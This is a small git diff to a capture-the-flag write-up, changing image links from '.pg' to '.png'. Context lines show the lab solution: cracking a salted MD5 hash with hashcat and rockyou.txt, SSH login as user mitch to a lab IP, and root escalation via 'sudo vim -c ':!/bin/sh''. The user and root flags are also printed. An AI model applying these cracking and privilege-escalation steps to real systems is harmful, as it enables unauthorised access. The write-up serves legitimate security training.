@@ -96,7 +96,7 @@ echo "0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2" > hash
 hashid hash
 ```
 
-![3.3](./imgs/3.3.pg)
+![3.3](./imgs/3.3.png)
 
 Hash type could be md5
 
@@ -106,7 +106,7 @@ Hash type could be md5
 hashcat -a0 -m20 hash /usr/share/wordlists/rockyou.txt
 ```
 
-![3.4](./imgs/3.4.pg)
+![3.4](./imgs/3.4.png)
 
 **PASSWORD**: secret
 
@@ -116,7 +116,7 @@ Log into SSH with found credentials
 ```
 ssh mitch@10.10.145.85 -p2222
 ```
-![4.1](./imgs/4.1.pg)
+![4.1](./imgs/4.1.png)
 
 **USER FLAG**: G00d j0b, keep up!
 
@@ -125,7 +125,7 @@ Check privileges
 sudo -l
 ```
 
-![4.2](./imgs/4.2.pg)
+![4.2](./imgs/4.2.png)
 
 Can run vim as root
 
@@ -136,6 +136,6 @@ From https://gtfobins.github.io/gtfobins/vim/#sudo
 sudo vim -c ':!/bin/sh'
 ```
 
-![5.1](./imgs/5.1.pg)
+![5.1](./imgs/5.1.png)
 
 **ROOT FLAG**: W3ll d0n3. You made it!
